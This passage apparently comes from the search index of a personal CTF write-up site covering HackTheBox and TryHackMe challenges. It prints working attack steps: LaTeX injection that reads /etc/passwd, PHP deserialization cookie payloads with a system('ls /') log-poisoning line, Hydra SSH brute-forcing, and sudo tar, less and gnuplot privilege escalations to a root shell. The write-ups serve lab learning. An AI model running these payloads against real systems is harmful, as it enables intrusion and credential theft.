basically, I had to open 997 more files then I started looking for scripts that could do it.</p> <p>But firstly when you unzip the file you will find 2 files pwd.png and flag_999.zip</p> <p></p> <p>Now to unzip the flag_999.zip you need to open the pwd.png image and crack the morse code And use that cracked code to unzip the file</p> <p>Just for sake let me show how it will be done manually but we are not going to do it manually will automate the whole process so let\u2019s have a look at how it is done.</p> <p>We open the pwd.png file first</p> <p> Then used an online Morse code translator to decode the Cipher text</p> <p> This means the answer is 9 to unzip the file and we will be successful to unzip it</p> <p> Now the script we are going to use is going to take the image read the morse code from the PNG file unzip the file and continue this loop until we reach the last file</p> <p><pre><code>import re  \nimport os  \nimport sys  \nimport zipfile  \nfrom PIL import Image  \n\ndef get\\_pass(morse\\_list):  \n</code></pre> This code is written by some Chinese hacker let\u2019s understand the code and break it down a bit.</p>"},{"location":"CTF/HackTheBox-M0rsarchive/#code-analysis","title":"Code analysis","text":"<p>Now this function what is basically does is, it decodes the Morse code after it has been extracted from the PNG file and returns the decoded value into an object called password</p> <p><pre><code>def get\\_pass(morse\\_list):  \n password = \"\"  \n MORSE\\_CODE\\_DICT = {'.-': 'a', '-...': 'b', '-.-.': 'c', '-..': 'd','.': 'e', '..-.': 'f', '--.': 'g', '....': 'h','..': 'i', '.---': 'j', '-.-': 'k', '.-..': 'l','--': 'm', '-.': 'n', '---': 'o', '.--.': 'p','--.-': 'q', '.-.': 'r', '...': 's', '-': 't','..-': 'u', '...-': 'v', '.--': 'w', '-..-': 'x','-.--': 'y', '--..': 'z', '-----': '0', '.----': '1','..---': '2', '...--': '3', '....-': '4', '.....': '5','-....': '6', '--...': '7', '---..': '8', '----.': '9','-..-.': '/', '.-.-.-': '.', '-.--.-': ')', '..--..': '?','-.--.': '(', '-....-': '-', '--..--': ','}  \n for morse in morse\\_list:  \n password += MORSE\\_CODE\\_DICT.get(morse)  \n return password\n</code></pre> Now this function will read the Morse code from the PNG file or image and output into an object called output in the last line of the code you can see</p> <p><pre><code>def get\\_morse():  \n fp = open('./pwd.png', 'rb')  \n image = Image.open(fp)  \n pixel = list(image.getdata())  \n background = pixel[0]  \n chars = []  \n for i,v in enumerate(pixel):  \n if v == background:  \n chars.append(\" \")  \n else:  \n chars.append(\"*\")  \n output = \"\".join(chars)  \n \"\"\"\u6b63\u5219\u5339\u914d\u6d4b\u8bd5\u5efa\u8bae\uff1ahttps://regex101.com/  \n ^ : asserts position at start of a line  \n $ : asserts position at the end of a line  \n \\s : matches any whitespace character (equivalent to [\\r\\n\\t\\f\\v ])  \n * : matches the previous token between zero and unlimited times, as many times as possible, giving back as needed (greedy)  \n \\* : matches the character *  \n {3}: matches the previous token exactly 3 times  \n \"\"\"  \n output = re.sub(r'^\\s*', '', output) #\u5339\u914d\u5f00\u5934\u7684\u4efb\u610f\u4e2a\u7a7a\u767d\u5b57\u7b26\uff0c\u5e76\u66ff\u6362\u4e3a\u7a7a  \n output = re.sub(r'\\s*$', '', output) #\u5339\u914d\u7ed3\u5c3e\u7684\u4efb\u610f\u4e2a\u7a7a\u767d\u5b57\u7b26\uff0c\u5e76\u66ff\u6362\u4e3a\u7a7a  \n output = re.sub(r'\\*{3}', '-', output) #\u5339\u914d3\u4e2a*\u53f7\uff0c\u5e76\u66ff\u6362\u4e3a\u5b57\u7b26\"-\"  \n output = re.sub(r'\\*', '.', output) #\u5339\u914d\u5355\u4e2a*\u53f7\uff0c\u5e76\u66ff\u6362\u4e3a\u5b57\u7b26\".\"  \n output = re.sub(r'\\s{2,}', ' | ', output) #(\u7528\u4e8e\u5904\u7406\u591a\u884c\u6469\u65af\u5bc6\u7801\u7684\u60c5\u51b5)\u5339\u914d\u4e24\u4e2a\u4ee5\u4e0a\u7a7a\u767d\u5b57\u7b26\uff0c\u5982\u679c\u5b58\u5728\uff0c\u5c31\u66ff\u6362\u4e3a\"|\"  \n output = re.sub(r'\\s', '', output) #\u5339\u914d\u7a7a\u767d\u5b57\u7b26\uff0c\u5e76\u66ff\u6362\u4e3a\u7a7a  \n output = output.split('|')  \n fp.close()  \n return output\n</code></pre> This i the last function which unzips the file using the decoded Morse code and the loop continues</p> <p><pre><code>def unzip\\_file(path, number, password):  \n zip\\_path = \"flag\\_\" + str(1000-number) + \".zip\"  \n fp = zipfile.ZipFile(zip\\_path)  \n for file in fp.namelist():  \n fp.extract(file,\"./\",pwd=password.encode(\"utf-8\"))  \n fp.close()  \n\ndef main():  \n path = sys.path[0] #\u5f53\u524d\u811a\u672c\u7684\u8fd0\u884c\u76ee\u5f55  \n\n for number in range(1,1001):  \n print(\"Processing the \"+ str(number) + \"th archive.\")  \n #print(os.listdir('.')) #\u663e\u793a\u5f53\u524d\u76ee\u5f55\u4e0b\u7684\u6240\u6709\u6587\u4ef6  \n morse\\_list = get\\_morse()  \n password = get\\_pass(morse\\_list)  \n unzip\\_file(path, number, password)  \n path = \"./flag\"  \n os.chdir(path) #\u5207\u6362\u5f53\u524d\u5de5\u4f5c\u76ee\u5f55(\u8fdb\u5165flag\u5b50\u76ee\u5f55)  \n\n fp = open('./flag', 'r')  \n flag = fp.readlines()  \n print(flag)  \n fp.close()  \n\n\nif \\_\\_name\\_\\_ == \"\\_\\_main\\_\\_\":  \n main()\n</code></pre> Now let\u2019s use this script to unzip the files</p> <p></p> <p> And we got the Flag</p> <p>Thank you for reading</p>"},{"location":"CTF/HackTheBox-RFlag/","title":"HackTheBox RFlag","text":"<p> <pre><code>HTB-Challenges:- Hardware\nChallenge Info:- Decoding cf32\u00a0\nChallenge level:- Easy\n</code></pre></p> <p>Download the file and checked its extension cf32 i dont know what it is so i searched about it and found that it is some form of radio fequency single also found that a perticular tool called rtl_433 is used to decode such signal.</p> <p>GitHub - merbanan/rtl_433: Program to decode radio transmissions from devices on the ISM bands (and\u2026Program to decode radio transmissions from devices on the ISM bands (and other frequencies) - GitHub\u00a0\u2026github.com</p> <p></p> <p>Install the following tool if you want you can directly install it by using.</p> <p>If using Debian.</p> <pre><code>apt install rtl_433\n</code></pre> <p>If using macos.</p> <pre><code>brew install rtl_433\n</code></pre> <p>Now after installing using the tool.</p> <pre><code>rtl_433 -A signal.cf32\n</code></pre> <p>Now carefully see this this seems like hex.</p> <p> Im using cyberchef to decode this and i got the flag.</p> <p>Thank you for reading</p>"},{"location":"CTF/HackTheBox-RenderQuest/","title":"HackTheBox RenderQuest","text":"<p> <pre><code>HTB-Challenges- Web  \nChallenge Info:- Web  \nChallenge level:- Easy\n</code></pre></p> <p>CHALLENGE DESCRIPTION <pre><code>You\u2019ve found a website that lets you input remote templates for rendering. Your task is to exploit this system\u2019s vulnerabilities to access and retrieve a hidden flag. Good luck!\n</code></pre> download and the files and unzip it</p> <p></p> <p>In requirments file you will see a main.go file which basiclly contain all the request parameters for when you visit the the given ip and port you will be able to see a web page with a parameter which take inputs</p> <p>so we can try using webhook here beccause it allows entering external link</p> <p>we can externally build quires and the program will execute this</p> <p>why\u00a0???</p> <p>lets take a look at the source code the program that is executing all the progam after we click on the render now button</p> <p> main.gowe will build the request accordingly using</p> <p>https://webhook.site/</p> <p>lets try the FetchServerInfo first and test if it works or not</p> <p> Now copy the user and paste it in the given parameter on the website</p> <p> So it did work lets take step back in the directory and check</p> <p>modiying the request accordingly</p> <p></p> <p></p> <p>And we can see the flag you can modify the request and make it</p> <p></p> <p>Thank you for reading</p>"},{"location":"CTF/HackTheBox-Signals/","title":"HackTheBox Signals","text":"<p> <pre><code>HTB-Challenges:- Hardware\nChallenge Info:- Decoding Wav signals\nChallenge level:- Easy\n</code></pre></p> <p>So starting the challenge it was obivus when i saw a\u00a0.wav file that its an audio file so there must be something related to analysing the graph or spectrogram but none the less i started the challenge and got to know that it is a sstv file so i looked about and found alot to be explored.</p> <p>We need 3 things.</p> <p>Now we need to install vb-audio virtual cable.</p> <p></p> <p>And configure it in the vlc player.</p> <p></p> <p>Like shown in the above picture.</p> <p>Then configure sstv or mmstv.</p> <p></p> <p>And now start the audio from vlc and wait untill it reveals the flag.</p> <p></p> <p>Thank you for reading</p>"},{"location":"CTF/HackTheBox-Topology/","title":"HackTheBox Topology","text":"<p>Started the machine got the IP address and started an Nmap scan</p> <pre><code>Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-19 13:48 IST  \nNmap scan report for latex.topology.htb (10.10.11.217)  \n</code></pre> <p>Port 22 and 80 were open ssh &amp; http so opened the browser and got a web page looked into the page source and found another link.</p> <p>latex.topology.htb</p> <p></p> <p>And got a page which converted whatever text we put into png and reflect it back.</p> <p></p> <p>So i looked around a bit about this and found that there can be an Latex injection.</p> <p>https://0day.work/hacking-with-latex/ https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection?source=post_page-----99b485c380dc--------------------------------</p> <p>I used the following injection first to check what comes back.</p> <pre><code>$\\lstinputlisting{/etc/passwd}\n</code></pre> <p></p> <p>And it reflected back with this after that I used another payload.</p> <p><pre><code>$\\lstinputlisting{/var/www/dev/.htpasswd}$\n</code></pre> And it worked I got the /var/www/dev/.htaccess file and its content and found a user.</p> <p>vdaisley and a hashed value which was found to be a md5 hash to decrypt it and get a password.</p> <p>Used it to login vai ssh.</p> <p></p> <p>And we got a shell.</p> <p>Now in the to get the root access i used pspy64 and uploaded it with a local python http server and run it and as i got the file i made it executable and then run it.  </p> <p>https://github.com/DominicBreuker/pspy/releases/tag/v1.2.1?source=post_page-----99b485c380dc--------------------------------</p> <p></p> <p>Now i used <pre><code>echo 'system \"chmod u+s /bin/bash\"' &gt; opt/gnuplot/rooter.ptl\n</code></pre></p> <p>And waited untill the /bin/bash becomes root. Check it using.</p> <pre><code>ls -la /bin/bash\n</code></pre> <p>As soon it becomes root run the following command.</p> <pre><code>/bin/bash -p\n</code></pre> <p> And we got the root shell and the root flag.</p> <p>Thank you for reading.</p>"},{"location":"CTF/HackTheBox-Toxic/","title":"HackTheBox Toxic","text":"<p> <pre><code>HTB-Challenges:- Web\u00a0  \nChallenge Info:- Web-Application-based \nChallenge level:- Easy\n</code></pre></p> <p>Started the machine and got the ip and port opened the browser and entered URL.</p> <p></p> <p>Got a Simple web page and also downloaded the Necessary files to play the challenge. unzipped the file\u00a0and there we go the flag, lol not so easily its just a test flag.</p> <p></p> <p>So i continued to manually find any clue in the files and finally saw something interesting.</p> <p>Toxic/web_toxic/challenge/index.php</p> <p></p> <p>Serialize and Unserialize as soon as I saw this I knew it was an Insecure Deserialization vulnerability So I looked at the cookie of the URL that opened.</p> <p></p> <p>Now i copied the cookie and decoded it base64.</p> <p></p> <p><pre><code>O:9:\"PageModel\":1:{s:4:\"file\";s:15:\"/www/index.html\";}%\n</code></pre> now I was more confident that it must be an Insecure Deserialization vulnerability</p> <p>Reference for Insecure Deserialization</p> <p>Insecure Deserialization Edit descriptiontanish-26.gitbook.io</p> <p>So now i made some changes in the cookie to test it.</p> <pre><code>\"O:9:\"PageModel\":1:{s:4:\"file\";s:11:\"/etc/passwd\";}\"\n</code></pre> <p>And again encoded it as base64.</p> <pre><code>Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxMToiL2V0Yy9wYXNzd2QiO30K\n</code></pre> <p>Now used burp suite to capture the request and in the repeater changed the values for this particular parameter.</p> <p><pre><code>Cookie: PHPSESSID= \n</code></pre> And put the encoded value there.</p> <p></p> <p>And it worked, so now we can look for how can we obtain the flag\u00a0 because it was mentioned in the lab description not to obtain a shell but we in to fetch the flag.</p> <p>Let\u2019s do that first I requested /var/log/nginx/access.log and again encoded it as base64 and sent the request.</p> <p></p> <p>So the user-agent was reflected as well we can try putting a payload in the user-agent.\u00a0  </p> <p>let\u2019s do that and try again and this time got it, it listed all the contents of the / folder including the flag.</p> <pre><code>&lt;? Php system('ls /');?&gt;\n</code></pre> <p>Also base64 encode it.</p> <pre><code>echo 'O:9:\"PageModel\":1:{s:4:\"file\";s:11:\"/flag\\_abY2P\";}' | base64\n</code></pre> <p><pre><code>Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxMToiL2ZsYWdfYWJZMlAiO30K\n</code></pre> Send the request and here we got the flag.</p> <p></p> <p>Thank you for reading</p>"},{"location":"CTF/HackTheBox-Weather-App/","title":"HackTheBox Weather\u00a0App","text":"<p> <pre><code>HTB-Challenges:- Web\nChallenge Info:- Web-Application-based \nChallenge level:- Easy\n</code></pre></p> <p>Firstly I downloaded the Necessary files to play the challenge. and started the machine.</p> <p></p> <p>Now I started looking manually into files I downloaded and on inspection in file a file package.js, that the node-js version was old and I compared it with the latest version which can be seen clearly,</p> <p></p> <p>Also there was a fake flag for testing</p> <p></p> <p>On analysing the index.js file in /web_weather_app/challenge/routes\u00a0 found out that if you login as admin you will receive a flag otherwise, it will say \u201cyou are not admin\u201d</p> <p><pre><code>const path = require('path');  \nconst fs = require('fs');  \nconst express = require('express');  \nconst router = express.Router();  \nconst WeatherHelper = require('../helpers/WeatherHelper');  \nlet db;  \nconst response = data =&gt; ({ message: data });  \n</code></pre> Also found API call /api/weather that fetches the weather info this is interesting we can try using different javascript event handlers here and try to fetch the flag or we can try something else.</p> <p></p> <p>I also did directory brute force just in case If i missed something.</p> <p></p> <p>We found /login and /register which were obvious to be found as we already looked in the login function index.js.</p> <p>Now I searched about and found a node js code which will basically reset the admin and password.</p> <p>Note that you will need to change the IP and port number and the city and country.</p> <pre><code>import fetch from 'node-fetch';  \nasync function makeRequest() {  \n</code></pre> <p>Also if you have not installed you need to install node-js in your system\u00a0 so if you are using linux you can simply use.</p> <pre><code>sudo apt install node\n</code></pre> <p>In my case, I\u2019m using macOS so mac users use.</p> <p><pre><code>sudo brew install node\n</code></pre> </p> <p>Now open /login page and enter the credentials for the admin which is reset to admin:test</p> <p> And we get the flag</p> <p></p> <p>Thank you for reading</p>"},{"location":"CTF/Hackthebox_Photonlocakdown/","title":"HackTheBox Photon Lockdown","text":"<pre><code>HTB-Challenges:- Hardware\nChallenge Info:- Device Firmware\nChallenge level:- Very Easy\n</code></pre> <p>CHALLENGE DESCRIPTION:- <pre><code>We\u2019ve located the adversary\u2019s location and must now secure access to their \nOptical Network Terminal to disable their internet connection. Fortunately,\nwe\u2019ve obtained a copy of the device\u2019s firmware, which is suspected to \ncontain hardcoded credentials. Can you extract the password from it?\n</code></pre></p> <p>As you uzip the file you will see 3 more files.</p> <p></p> <p>Now fwu_ver contains some version details of the frimware i guess.</p> <pre><code>3.0.5\n</code></pre> <p>And hw_ver contains some data i didnt undstood its most probably the firmware name X1.</p> <p>And the rootfs is a squash file.</p> <p>Squashfs is a compressed read-only file system for Linux. Squashfs compresses files, inodes and directories.</p> <p>So we can use squashfs utility here to be specific unsquashfs which will extract all the content of rootfs file.</p> <pre><code>sudo unsquashfs rootfs\n</code></pre> <p></p> <p>Now we can explore squashfs-root folder.</p> <p></p> <p>Now i looked around abit and in the /home directory.</p> <p></p> <p>So i know all config file are in /etc folder so i looked in the /etc and stared looking into files for HTB flag</p> <p>I looked mannually but there is also another way uisng.</p> <pre><code>grep --include=*.{txt,conf,xml,php} -rnw '.' -e 'HTB' 2&gt;/dev/null\n</code></pre> <p>Now this perticular command what this will do is check all file if there is any text, config, xml and php files containg the word HTB if there is any that will print it.</p> <p>And in the config_default.xml finally found the flag.</p> <p>Using the command.</p> <p></p> <p></p> <p>And got the flag.</p> <p>Thank you for Reading</p> <p>I have just owned challenge Photon Lockdown from Hack The Box</p>"},{"location":"CTF/Hackthebox_The_Needle/","title":"HackTheBox The Needle","text":"<pre><code>HTB-Challenges:- Hardware\nChallenge Info:- Firmware analysis\nChallenge level:- Very Easy\n</code></pre> <p>CHALLENGE DESCRIPTION <pre><code>As a part of our SDLC process, we\u2019ve got our firmware \nready for security testing. Can you help us by\nperforming a security assessment?\n</code></pre> As soon as you download the requirement file after unzipping it you will see a firmware.bin file now to extract a\u00a0.bin file we will use binwalk</p> <pre><code>\u2570\u2500 binwalk -e firmware.bin\n</code></pre> <p>After it is extracted the move into the extracted folder now we need to find any file that contains login info to login</p> <pre><code>grep -rn \"./\" -e login\n</code></pre> <p>Using this command found.</p> <p></p> <p>Got the username now moving to find the password and it is related to something related to sign so lets try find it using the following command.</p> <p>And found the password.</p> <p></p> <p>Now logging in using nc and the username and password we have:</p> <p></p> <p>And we also got the flag.</p> <p>Thank you for reading.</p> <p>I have just owned challenge The Needle from Hack The Box</p>"},{"location":"CTF/TryHackMe-Bounty-Hunter/","title":"TryHackMe Bounty\u00a0Hunter","text":"<p> <pre><code>TryhackMe Machine:- Bounty Hunter\nMachine Info:- \nMachine Level:- Easy\n</code></pre></p> <p>Lets start with an quick nmap scan and see which ports are open and working.</p> <p>Nmap Scan</p> <pre><code>Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 3.0.3|\nftp-syst: |   STAT: | FTP server status:|      Connected \nto ::ffff:10.17.33.72|      Logged in as ftp|      TYPE: \nASCII|No session bandwidth limit|      Session timeout in\nseconds is 300| Control connection is plain text|      \nData connections will be plain text|      \nAt session startup, client count was 4|      vsFTPd 3.0.3\n- secure, fast, stable|_End of status| ftp-anon: Anonymous \nFTP login allowed (FTP code 230)| -rw-rw-r--    1 ftp      \nftp           418 Jun 07  2020 locks.txt|_ -rw-rw-r--    1 ftp      ftp            \n68 Jun 07  2020 task.txt22/tcp open  ssh    \nOpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |\n2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)|\n256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)|\n_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))|_http-title: \nSite doesn't have a title (text/html).|_http-server-header: \nApache/2.4.18 (Ubuntu)Aggressive OS guesses: HP P2000 G3 NAS device (91%), \nLinux 2.6.32 (90%), Linux 2.6.32 - 3.1 (90%), Ubiquiti AirMax NanoStation \nWAP (Linux 2.6.32) (90%), Linux 3.7 (90%), Linux 5.0 (90%), Linux 5.1 (90%),\nUbiquiti AirOS 5.5.9 (90%), Linux 5.0 - 5.4 (89%), Ubiquiti Pico Station WAP\n(AirOS 5.2.6) (89%)No exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 5 hopsService Info: OSs: Unix, Linux; CPE: cpe:/\no:linux:linux_kernelTRACEROUTE (using port 80/tcp)HOP RTT       ADDRESS1   \n22.96 ms  10.17.0.12   ... 45   145.37 ms 10.10.0.198OS and Service detection \nperformed. Please report any incorrect results at https://nmap.org/submit/ .Nmap \ndone: 1 IP address (1 host up) scanned in 33.70 seconds\n</code></pre> <p>We can see in the nmap result that ftp port 21 and ssh port 22 is open firstly im going to try ftp into the machine.</p> <p>FTP into the machine.</p> <p>The FTP is accessible try login with anonymous. command\u00a0:-</p> <p>Ftp  when asked for user enter anonymous. <pre><code>ftp&gt; ls -la200 PORT command successful. Consider using PASV.150 \nHere comes the directory listing.\ndrwxr-xr-x    2 ftp      ftp          4096 Jun 07 21:47 \ndrwxr-xr-x    2 ftp      ftp          4096 Jun 07 21:47 \n-rw-rw-r--    1 ftp      ftp           418 Jun 07 21:41 locks.txt\n-rw-rw-r--    1 ftp      ftp            68 Jun 07 21:47 task.txt226 \nDirectory send OK.ftp&gt;\n</code></pre> <p>We got 2 files in afte we successfully logined in into the ftp server.</p> <p>Get the files locks.txt and task.txt they are needed in further enumeration.</p> <pre><code>get task.txtget locks.txt\n</code></pre> <p>After this we analysed the files and in task.txt we found a user (lin).</p> <pre><code>$ cat task.txt1.) Protect Vicious.2.) Plan for Red Eye pickup on the moon.-lin\n</code></pre> <p>locks.txt Clearly looks like a wordlist so we will use it for bruteforce.</p> <pre><code>*$ cat locks.txt* \n- rEddrAGON- ReDdr4g0nSynd!cat3\n- Dr@gOn$yn9icat3\n- R3DDr46ONSYndIC@Te- ReddRA60N\n- R3dDrag0nSynd1c4te- dRa6oN5YNDiCATE\n- ReDDR4g0n5ynDIc4te- R3Dr4gOn2044\n- RedDr4gonSynd1cat3- R3dDRaG0Nsynd1c@T3\n- Synd1c4teDr@g0n- reddRAg0N\n- REddRaG0N5yNdIc47e- Dra6oN$yndIC@t3\n- 4L1mi6H71StHeB357- rEDdragOn$ynd1c473\n- DrAgoN5ynD1cATE- ReDdrag0n$ynd1cate\n- Dr@gOn$yND1C4Te- RedDr@gonSyn9ic47e\n- REd$yNdIc47e- dr@goN5YNd1c@73\n- rEDdrAGOnSyNDiCat3- r3ddr@g0N- ReDSynd1ca7e\n</code></pre> <p>I used hydra to brute force ssh login using the user name lin and the wordlist locks.txt.</p> <pre><code>hydra -l lin -P locks.txt &lt;IP_Address&gt; ssh\n</code></pre> <pre><code>Hydra v9.2 (c) 2021 by van Hauser/THC &amp; David Maciejak \n- Please do not use in military or secret service organizations, \nor for illegal purposes (this is non-binding, these \n*** ignore laws and ethics anyway).\nHydra (https://github.com/vanhauser-thc/thc-hydra) \nstarting at 2021-12-22 21:45:38[DATA] max 16 tasks per 1 server,\noverall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task[DATA] attacking ftp://10.10.0.198:21/1 of 1 target completed, 0 valid password foundHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-12-22 21:45:39\n</code></pre> <p>We found the password and login via ssh we see the user flag we just cat the user flag user.txt\u200a\u2014\u200aTHM{userflag}.</p> <p>Now we need to escalate our privilege we can exploit lin\u2019s sudo privilege.</p> <pre><code>lin@bountyhacker:~$ sudo -l[sudo] password for lin: \nMatching Defaults entries for lin on bountyhacker:    \nenv_reset, mail_badpass, \nsecure_path=/usr/local/sbin\\:/usr/local/bin\\:\n/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser \nlin may run the following commands on bountyhacker:    \n(root) /bin/tar\n</code></pre> <p>I searched more on tar sudo privilege escaltion and found this.</p> <p>just run the following command.</p> <pre><code>sudo tar -cf /dev/null /dev/null - checkpoint=1 - checkpoint-action=exec=/bin/sh\n</code></pre> <p> Now we have a root access you can see by typing\u00a0:- sudo -l.</p> <p>And got the root access and the root flag.</p> <p> Thank you for reading</p>"},{"location":"CTF/TryHackMe-Brooklyn-Nine-Nine/","title":"TryHackMe Brooklyn Nine-Nine","text":"<p> <pre><code>TryhackMe Machine:- Brooklyn Nine Nine\nMachine Info:- pwn\nMachine Level:- Easy\n</code></pre></p>"},{"location":"CTF/TryHackMe-Brooklyn-Nine-Nine/#reconnaissance","title":"Reconnaissance","text":"<p>On visiting the given IP you will see a simple page with an image.</p> <p></p> <p>On checking the page source, I didn't find anything.</p> <p>I did an Nmap scan.</p> <pre><code> nmap 10.10.214.64Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-28 17:54 ISTNmap scan report for 10.10.214.64Host is up (0.14s latency).Not shown: 997 closed tcp ports (conn-refused)PORT   STATE SERVICE21/tcp open  ftp22/tcp open  ssh80/tcp open  httpNmap done: 1 IP address (1 host up) scanned in 35.68 seconds\n</code></pre> <p>And port 21 ftp was open and I tried anonymous login on it and got in and found a txt file and pulled it out.</p> <p></p> <p>And found a message from Amy to Jake telling him that his password is weak now let's try fuzzing the password of jake using hydra.</p> <pre><code>hydra hydra -l jake -P rockyou.txt ssh://10.10.214.64 ssh -t 4\n</code></pre> <p></p> <p>And successfully logged in as jake also got the user flag inside holt.</p> <p></p> <p>Privilege Escalation</p> <p>Used the simplest thing a CTF mostly have, the easy level ones have is to check using Sudo -l and as expected you will see.</p> <p></p> <p>On checking on https://gtfobins.github.io/ found a method.</p> <pre><code>sudo less /etc/profile !/bin/bash\n</code></pre> <p></p> <p>And we got the root user and the final flag.</p> <p></p> <p>Thanks you for Reading</p>"},{"location":"CTF/TryHackMe-Committed/","title":"TryHackMe Committed","text":"<pre><code>TryhackMe Machine:- Git Happens\nMachine Info:- (Git)\nMachine Level:- Easy\n</code></pre> <p>As soon as you start the machine a new window will open up and a web-based VM machine will start.</p> <p></p> <p>Now you will be able to see a zip file commited.zip.This file does not have a password to unzip.\u00a0So you can just use unzip commited.zip to unzip it, and you will be able to see its contents.</p> <p></p> <p>There are 2 files and a \u201c.git\u201d folder; there is nothing in the main.py and \u201creadme.md\u201d, i looked in the \u201c.git\u201d.</p> <p></p> <p>I have used git show command to check the history of the repo.</p> <p></p> <p>In the logs folder, \u201cHEAD\u201d found the commits and found a weird commit called Oops.</p> <p></p> <p>So i copied the ID and used it.</p> <p>git show (followed by the id).</p> <p></p> <p>We got the flag.</p> <p>Although these labs are very easy, they cover the basics of git That's why im doing these labs.\u00a0I will soon start medium-level labs too.thank you for reading.</p>"},{"location":"CTF/TryHackMe-Git-Happens/","title":"TryHackMe Git\u00a0Happens","text":"<pre><code>TryhackMe Machine:- Git Happens\nMachine Info:- (Git)\nMachine Level:- Easy\n</code></pre> <p>Started of with nmap scan</p> <pre><code>Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-31 17:50 ISTNmap scan report for 10.10.77.136Host is up (0.16s latency).Not shown: 999 closed tcp ports (conn-refused)PORT   STATE SERVICE VERSION80/tcp open  http    nginx 1.14.0 (Ubuntu)|_http-title: Super Awesome Site!|_http-server-header: nginx/1.14.0 (Ubuntu)| http-git:|   10.10.77.136:80/.git/|     Git repository found!|_    Repository description: Unnamed repository; edit this file 'description' to name the...Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 48.08 seconds\n</code></pre> <p>We can see /.git/ folder is there lets get this whole /.git/ .</p> <pre><code>wget --mirror -I .git http://10.10.77.136/.git/\n</code></pre> <p>Now cd into 10.10.77.136 and check the using git show.</p> <p>Then use git status and then use.</p> <pre><code>git reset HEAD --hard \n</code></pre> <p>Now using the git log command to see oneline commets.</p> <pre><code>git log --oneline --graph\n</code></pre> <p></p> <p>You will see that HEAD 395e087 nothing significant was here now lets check the index.html and you will see the the password and the flag there use the admin password as flag.</p> <p></p> <p>Thank you for reading</p>"},{"location":"CTF/TryHackMe-Grep/","title":"TryHackMe Grep","text":"<pre><code>TryhackMe Machine:- Grep\nMachine Info:- OSINT, WEB and Recon\nMachine level: Easy\n</code></pre> <pre><code>Welcome to the OSINT challenge, part of TryHackMe\u2019s Red Teaming Path. \nIn this task, you will be an ethical hacker aiming to exploit a newly \ndeveloped web application.SuperSecure Corp, a fast-paced startup, is \ncurrently creating a blogging platform inviting security professionals \nto assess its security. The challenge involves using OSINT techniques \nto gather information from publicly accessible sources and exploit potentialvulnerabilities in the web application.Start by deploying \nthe machine; Click on the Start Machine button in the upper-right-handcorner \nof this task to deploy the virtual machine for this room.Your goal is \nto identify and exploit vulnerabilities in the application using a \ncombination of recon and OSINT skills. As you progress, you\u2019ll look \nfor weak points in the app, find sensitive data, and attempt to gain\nunauthorized access. You will leverage the skills and knowledge acquired\nthrough the Red Team Pathway to devise and execute your attack \nstrategies.Note: Please allow the machine 3 - 5 minutes to fully boot. \nAlso, no local privilege escalation is necessary to answer the questions.\n</code></pre> <p>There are 5 questions in total anyway I started the machine and got the IP\u00a0One thing to keep in mind is that we must focus more on the OISNT and Recon.</p> <p>Then did an Nmap scan.</p> <pre><code>Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-26 13:03 ISTNmap scan report for 10.10.94.60Host is up (0.16s latency).Not shown: 997 closed tcp ports (reset)PORT    STATE SERVICE  VERSION22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:|   3072 1e:18:65:17:68:fc:06:d6:f7:21:bd:7c:16:71:e8:eb (RSA)|   256 69:ef:62:fe:d3:cb:8c:62:e3:14:f5:c1:92:10:75:b0 (ECDSA)|_  256 fa:84:c0:4d:ff:24:ca:96:a2:0d:7a:ed:19:0c:93:45 (ED25519)80/tcp  open  http     Apache httpd 2.4.41 ((Ubuntu))|_http-title: Apache2 Ubuntu Default Page: It works|_http-server-header: Apache/2.4.41 (Ubuntu)443/tcp open  ssl/http Apache httpd 2.4.41| tls-alpn:|_  http/1.1|_ssl-date: TLS randomness does not represent time|_http-title: 403 Forbidden|_http-server-header: Apache/2.4.41 (Ubuntu)| ssl-cert: Subject: commonName=grep.thm/organizationName=SearchME/stateOrProvinceName=Some-State/countryName=US| Not valid before: 2023-06-14T13:03:09|_Not valid after:  2024-06-13T13:03:09Service Info: Host: ip-10-10-94-60.eu-west-1.compute.internal; OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 26.10 seconds\n</code></pre> <p>So ports 80 (HTTP) and 443(HTTPS) are open.</p> <p>I added it grep.thm to /etc/hosts.</p> <p>And open again run the directory brute force attack.</p> <p> The following were giving 200 so I visited /public/html/login.php/public/html/login.php/public/html/logout.php/public/html/register.php .</p> <p> So I tried some default credentials and it didn\u2019t work so I went to the registration page\u00a0register a random user but it failed says.</p> <p>Captured the request in the burp suite and checked now maybe we have another API key somewhere.</p> <p>So I looked back at the index page it says SearchMe let\u2019s search this on GitHub and hope to find something about there plus it is built using PHP so we have much more help in filtering.</p> <p> And searched a bit more and found the user and also the API key in the history section in one of the file.</p> <p> I edited the API key in the burp suite and again sent it and we successfully registered.</p> <p> Now login as the new registered user.</p> <p> And we got the first flag after we logged in.</p> <p>Again performed a directory brute force and found 1.</p> <pre><code>/index.php (Status: 200) [Size: 1471]  /index.php (Status: 200) [Size: 1471]  /login.php (Status: 200) [Size: 1981]  /logout.php (Status: 200) [Size: 154]  